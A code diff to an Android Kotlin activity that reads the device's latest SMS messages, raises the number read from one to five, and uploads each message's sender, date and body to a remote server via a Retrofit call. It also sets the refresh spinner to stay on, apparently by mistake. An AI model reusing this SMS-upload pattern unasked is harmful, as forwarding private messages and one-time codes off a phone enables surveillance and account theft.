@@ -56,19 +56,18 @@ class Dashboard : AppCompatActivity() {
         //Swipe to refresh
         swipeRefreshLayout.setOnRefreshListener {
             readSmsMessages()
-            swipeRefreshLayout.isRefreshing = false
+            swipeRefreshLayout.isRefreshing = true
         }
 
         // Check for READ_SMS permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
-            checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
-        ) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             requestPermissions(arrayOf(Manifest.permission.READ_SMS), 1)
         } else {
             readSmsMessages()
         }
 
     }
+
     @SuppressLint("MissingInflatedId")
     fun readSmsMessages() {
         // Read SMS messages, Telephony Parameters
@@ -77,7 +76,7 @@ class Dashboard : AppCompatActivity() {
             arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
             null,
             null,
-            Telephony.Sms.DATE + " DESC LIMIT 1" // Add a limit
+            Telephony.Sms.DATE + " DESC LIMIT 5" // Add a limit
         )
 
 
@@ -90,8 +89,7 @@ class Dashboard : AppCompatActivity() {
                 val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                 val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                 val formattedDate = SimpleDateFormat(
-                    "MMMM dd, yyyy | HH:mm",
-                    Locale.getDefault()
+                    "MMMM dd, yyyy | HH:mm", Locale.getDefault()
                 ).format(Date(date))
 
                 // Inflate custom layout for each item
@@ -108,42 +106,31 @@ class Dashboard : AppCompatActivity() {
                 // Add the custom layout view to the ListView
                 smsListView.addHeaderView(listItemView)
 
-                val consms = ("\n" + address + "\n" + formattedDate + "\n" +body)
+                val consms = ("\n" + address + "\n" + formattedDate + "\n" + body)
                 val sms = SMSData(consms)
 
-                RetrofitClient.instance.sendSMS(sms)
-                    .enqueue(object : Callback<SMSResponse> {
+                RetrofitClient.instance.sendSMS(sms).enqueue(object : Callback<SMSResponse> {
                         override fun onResponse(
-                            call: Call<SMSResponse>,
-                            response: Response<SMSResponse>
+                            call: Call<SMSResponse>, response: Response<SMSResponse>
                         ) {
                             if (response.body()?.success!!) {
 
                                 Toast.makeText(
-                                    applicationContext,
-                                    "Message Sent",
-                                    Toast.LENGTH_LONG
+                                    applicationContext, "Message Sent", Toast.LENGTH_LONG
                                 ).show()
 
                             } else {
                                 Toast.makeText(
-                                    applicationContext,
-                                    "Failed Sending Message",
-                                    Toast.LENGTH_LONG
+                                    applicationContext, "Failed Sending Message", Toast.LENGTH_LONG
                                 ).show()
-
-
                             }
                         }
 
                         override fun onFailure(call: Call<SMSResponse>, t: Throwable) {
                             Toast.makeText(applicationContext, t.message, Toast.LENGTH_LONG).show()
-
                         }
-
                     })
             }
-
             it.close()
             adapter.notifyDataSetChanged()
         }
